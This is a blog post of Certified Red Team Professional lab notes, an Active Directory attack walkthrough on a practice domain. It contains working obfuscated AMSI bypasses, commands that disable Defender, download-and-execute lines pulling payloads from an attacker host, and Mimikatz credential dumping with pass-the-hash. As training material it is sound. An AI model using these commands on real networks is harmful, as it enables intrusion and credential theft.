---
title: Certified Red Team Professional Notes
date: 2023-03-7 15:23
categories: [notes]
tags: [Windows, Active Directory]
--- 

# Certified Red Team Professional Notes

## Week 1

•  Enumerate useful information like users, groups, group memberships,
computers, user properties, trusts, ACLs etc. to map attack paths!

• Learn and practice different local privilege escalation techniques on a Windows machine.

• Hunt for local admin privileges on machines in the target domain using multiple methods.

• Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.

### Learning Objective 1

Enumerating Users, Computers, Domain Admins, and Enterprise Admins.

#### Using PowerView

Start a PowerShell session using Invisi-Shell to avoid enhanced logging. (\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat)

```powershell
C:\Users\studentx>cd \AD\Tools
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Load Powerview in the PowerShell Session

```powershell
. C:\Ad\Tools\PowerView.ps1
```
To see users in the domain, 

```powershell
Get-DomainUser
``` 

and to get only a specific property of all users, use the select-object cmdlet as such.

```powershell
Get-DomainUser | select -ExpandProperty samaccountname
```

To see domain computer objects

```powershell
Get-DomainComputer | select -ExpandProperty dnshostname
```

to see details of the DA group, can get SIDs, Membernames

```powershell
Get-DomainGroup -Identity "Domain Admins"
```

To enumerate members of the EA group

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins"
```

If you are not in the root domain, this command will not work. You need to query the root domain as EA group is only present in the root of the forest.

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

#### Using ADModule

In a different invisishell session, import the ADModule with

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

and 

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

Then you can begin user enumeration with 

```powershell
Get-ADUser -Filter *
```

Use the -Properties paramter to filter by the properties you want to see, for example

```powershell
Get-ADUser -Filter * -Properties * | select Samaccountname,Description
```

To list computers

```powershell
Get-ADComputer -Filter *
```

Enumerate Domain Administrators with

```powershell
Get-ADGroupMember -Identity 'Domain Admins'
```

Enumerate Enterprise Admins with

```powershell
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

### Learning Objective 2

Enumerate OUs, list all computers in the StudentMachines OU, List the GPOs, Enumerate GPO applied on the StudentMachines OU.

#### PowerView

To list all OUs

```powershell
Get-DomainOU
```

To only see the names of OUs

```powershell
Get-DomainOU | select -ExpandProperty name
```

Listing all computers in the StudentMachines OU more complicated

```powershell
(Get-DomainOU -Identity StudentMachines).distinguishedname |  %{Get-DomainComputer -SearchBase $_} | select name
```

To get GPOs

```powershell
Get-DomainGPO
```

To Enumerate GPO applied on the StudentMachines OU, you need to copy part of the gplink attribute from the output of the command below:

```powershell
(Get-DomainOU -Identity StudentMachines).gplink
```

The part you need to copy will look like 

`{7478F170-6A0C-490C-B355-
9E4618BC785D}`

Then, to see GPO applied to StudentMachines, use

```powershell
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-
9E4618BC785D}'
```

With powershell magic, you can do this all in one command:

```powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11, (Get-DomainOU -Identity StudentMachines).gplink.length-72)
```

### Learning Objective 3

Enumerate ACL for DA group, and view modify rights and permissions for students.

#### Using PowerView

To enumerate ACLs in the Domain Admins Group

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDS -Verbose
```

To check for modify rights/permissions, use `Find-InterestingDomainACL` from powerview as such

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<student name>"}
```

To see permissions for the RDP group 

```powershell
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "RDPUsers"}
```

### Learning Objective 4

#### Using Powerview

To enumerate all domains in the current forest

```powershell
Get-ForestDomain -Verbose
```

To map all the trusts of the domain 

```powershell
Get-DomainTrust
```

To list only the external trusts in the moneycorp.local forest

```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |
?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

To identiy external trusts of the dollarcorp domain, we can use the below command.

```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

Since we have Bidirectional trust between these 2 forests, we can extract information from the eurocorp.local forest. You need either bi-directional or one-way trust from the eurocorp.local to dollarcorp to be able to use the below command.

```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -
Domain $_.Name}
```

### Learning Objective 5

In this learning objective we will exploit a service on our machine to elevate privileges to local admin. Then Identiy a machine on the domain where we have local admin access. Also we use privileges of a user on jenkins on a host to get admin privileges on the dcorp-ci server.

We begin by loading powerview after bypassing amsi. 

```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

We can use the abuse-function (`Invoke-ServiceAbuse`) and add our current domain user to the local Administrators group.

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp/student520' -Verbose
```

Logging in and out shows we have local administrator privileges.

For the next task, we will identify a machine in the domain where we have local admin using the Find-PSRemotingLocalAdminAccess.ps1

```powershell
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
[snip]
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```

We have admin access on dcorp-adminsrv and on the student machine, we can connect to dcorp-adminsrv using winrs as the student user with

```powershell
winrs -r:dcorp-adminsrv cmd
```

Or you can do it with PowerShell Remoting

```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorpadminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> [dcorpadminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents> whoami
dcorp\studentx
```

### Learning Objective 6

This learning objective focuses on setting up `BloodHound` to identify the shortest path to Domain Admins in the domain. BLoodhound uses neo4j graph database, so that needs to be set up first.

Install and start the neo4j service as follows:

```powershell
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat install-service
Neo4j service installed
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat start
```

Once the service is installed browse to localhost:7474 and login with neo4j:neo4j creds, and openblood hound from C:\AD\Tools\bloodHound-win32-x64\BloodHound-win-32-x64 and provide the details 

bolt://localhost:7687 and the user/pass you set in the previous step. Then run the .net AMSI bypass by using this

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

Then run the following commands to run the collector: 
```powershell
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> $ZQCUW
[snip .NET AMSI bypass]
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> .
.\SharpHound.ps1
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> InvokeBloodHound -CollectionMethod All -Verbose
2023-03-03T07:01:16.5006490-08:00|INFORMATION|This version of SharpHound is
compatible with the 4.2 Release of BloodHound
2023-03-03T07:01:16.8282702-08:00|INFORMATION|Resolved Collection Methods:
Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container,
RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-03T07:01:16.8595176-08:00|INFORMATION|Initializing SharpHound at 7:01
AM on 3/3/2023
2023-03-03T07:01:22.3601219-08:00|INFORMATION|Flags: Group, LocalAdmin,
GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps,
DCOM, SPNTargets, PSRemote
[snip]
SharpHound Enumeration Completed at 7:02 AM on 3/3/2023! Happy Graphing!
```
Once the data is uploaded to bloodhound, search for shortest path to domain admins, ctrl will toggle labels.

### Learning Objective 7

Identify a machine in the target domain where a domain admin session is available, and compromise the machine and escalate to prvileges to domain admin.

From our reverse shell we got on the CI machine through jenkins, we can grab PowerView from our attack machine and look for machines where a domain admin is logged in using Find-DomainUserLocation.

First you grab the sbloggingbypass.txt from the attackers machine with

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr
http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```

use the below command to bypass AMSI

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> S`eT-It`em ( 'V'+'aR'
+ 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) )
; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'
s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )
```

Then download and executre PowerView in memory on the victim machine with 

```powershell
iex ((New-Object
Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
``` 

Make sure to host the file using HFS.exe or your prefered choice of hosting software. Then run

```powershell
Find-DomainUserLocation
```

This command can take a while, but you can see if there is a domain admin session available. You can abuse it by using winrs or powershell remoting. To use winrs,
use 

```powershell
winrs -r:dcorp-mgmt hostname;whoami
```

Then we can run safetykatz.exe on the dcorp-mgmt to extract credentials. To do that, we need to copy loader.exe on dcorp-mgmt from the dcorp-ci machine we have to avoid any downloading activity on dcorp-mgmt.

Run the following command on the reverse shell

```powershell
iwr http://172.16.100.20/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Then copy it to the victim machine as such

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Using winrs add the following port forward rule on dcorp-mgmt to avoid detected

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20"
```

Note that the $null variable is used to address output redirection issues. Use loader.exe to download and execute SafetyKatz.exe in memory on the dcorp-mgmt machine with this command on the reverse shell

```powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

To do it with powershell remoting, first check we can run commands on the dcorp-mgmt machine with 

```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
```

Then we'll use Invoke-Mimi.ps1. Start by hosting it on your machine and running this on the reverse shell

```powershell
iex (iwr http://172.16.100.20/Invoke-Mimi.ps1 -UseBasicParsing)
```

Then we need to disable AMSI on the dcorp-mgmt machine, we can do the AMSI bypass shown earlier or use the built in Set-MpPreference as well because we are admins on the dcorp-mgmt machine.

```powershell
$sess = New-PsSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

Using Rubeus:

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256 hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Will open a new process, which we can access the domain controller using

```powershell
winrs -r:dcorp-dc whoami
```

Now we need to escalate to domain admin using derivative local admin. Let's find out the machines which we have local admin privileges by loading a powershell session with invisishell and enter the following commands

```powershell
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```

We have local admin on the dcorp-adminsrv, but any attempt to run loader.exe results in error 'this program is blocked by group policy', and any attempts to run invoke-mimi results in errors about language mode. This is because we are dropped into Constrained Language Mode when using PSRemoting. We can check if applocker is configured on dcorp-adminsrv by querying registry keys.

```powershell
winrs -r:dcorp-adminsrv cmd
reg query HKLM\Software\Policies\Microsft\Windows\SRPV2
```

and it looks like applocker is configured. Going through the policies will show that only Microsoft signed binaries and scripts are allowed, however there is a certain rule that is overly permissive.

```powershell
C:\Users\studentx>reg query
HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454fa263-2515c8796a5d
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b934c-454f-a263-2515c8796a5d
AlteredSecurity Attacking and Defending Active Directory 41
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b934c-454f-a263-2515c8796a5d
 Value REG_SZ <FilePathRule Id="06dce67b-934c-454f-a263-
2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files
folder" Description="Allows members of the Everyone group to run scripts that
are located in the Program Files folder." UserOrGroupSid="S-1-1-0"
Action="Allow"><Conditions><FilePathCondition
Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

A default rule is enabled that allows everyone to run scripts from the C:\Program Files\ Folder. We can also confirm this using powershell as such

```powershell
Enter-PSSession dcorp-adminsrv

$ExecutionContext.SessionState.LanguageMode

Get-AppLockerPolicy -
Effective | select -ExpandProperty RuleCollections
```

We can drop scripts in the Program Files directory and execute them from there, but we'll need to disable defender first using

```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 ```

 Also, because we can not . source scripts because of the CLM, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script to the target server.

Create Invoke-MimiEx.ps1
- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.
- Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Add "Invoke-Mimi -Command '"sekurlsa::ekeys"' " (without quotes) to the end of the file.

Then run this command to copy it to the target machine

```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Then run the script without . sourcing as such

```powershell
.\Invoke-MimiEx.ps1
```

And we can get credentials for srvadmin, appadmin, and websvc users. From local system (as admin) we can overpass the hash using safetykatz:

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin
/domain:dollarcorp.moneycorp.local
/aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
/run:cmd.exe" "exit"
```

The new process spawned has srvadmin privileges, we can check if srvadmin has admin privileges on other machines as such:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
 ```

 And we will see that we have local admin access on the dcorp-mgmt as srvadmin, which we know already has a session of svcadmin. We can use SafetyKatz to extract more credentials from the machine. Run the below commands from the process running as srvadmin. First copy the loader to dcorp-mgmt:

 ```powershell
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorpmgmt\C$\Users\Public\Loader.exe
```

extract the credentials:

```powershell
winrs -r:dcorp-mgmt cmd
>C:\Users\Public\Loader.exe -path
http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

We can also use Invoke-Mimi with PSRemoting as such

```powershell
Enter-PSSession -ComputerName dcorp-mgmt
```

And then disable AMSI using the "set item" blob. then download and execute InvokeMimi as following

```powershell
iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)

Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

We can also use Invoke-Mimi to look for credentials from the credentials vault, sometimes interesting credentials like those used for scheduled tasks will be stored here. You can do this as such:

```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

Finally, we can use the svcadmin credentials on the student VM using OverPasstheHaash as such:

```powershell
> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin
/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
/opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
```

And the new process wil start with the privileges of SVCadmin.

### Learning Objective 8

In this learning objective we will extract secrets from the DC of dollarcorp, using the secrets of KRBTGT account to make a golden ticket, and use the golden ticket to get domain admin privileges from a machine.

